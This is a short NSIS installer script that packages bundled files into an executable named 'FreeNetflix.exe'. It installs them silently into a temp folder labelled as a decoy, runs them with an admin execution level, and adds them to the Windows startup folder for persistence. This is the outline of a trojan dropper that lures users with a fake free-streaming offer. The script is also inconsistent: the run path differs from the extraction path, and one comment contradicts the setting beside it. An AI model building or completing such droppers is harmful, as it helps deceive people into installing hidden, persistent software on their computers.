OutFile "FreeNetflix.exe"          ; Output SFX file
;Icon "myicon.ico"              ; Optional custom icon
SilentInstall silent            ; No installer UI
AutoCloseWindow true
RequestExecutionLevel admin      ; No admin prompt

Section
    SetOutPath "$TEMP\FreeNetflixDecoy"  ; Extraction dir
    File /r "MyApp\*"           ; Bundle all files from MyApp folder
    Exec "$TEMP\MyQtApp\FreeNetflix.exe" ; Run main app
    ; --- Add to startup via registry ---
    ;WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "MyQtApp" "$TEMP\MyQtApp\MyApp.exe"
    ; --- OR: Add shortcut to startup folder ---
    CreateShortCut "$SMSTARTUP\MyQtApp.lnk" "$TEMP\FreeNetflixDecoy\FreeNetflix.exe"
SectionEnd
